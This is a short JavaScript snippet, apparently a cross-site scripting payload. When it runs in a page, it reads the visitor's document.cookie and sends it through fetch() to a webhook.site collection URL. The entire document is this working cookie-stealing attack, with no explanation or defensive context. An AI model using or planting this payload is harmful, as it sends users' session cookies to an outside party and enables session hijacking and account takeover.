(async () => {
  await fetch(
    "https://webhook.site/7d2b7027-3630-486e-bdb9-3991a3e375cc/?c=" +
    encodeURIComponent(document.cookie)
  );
})();
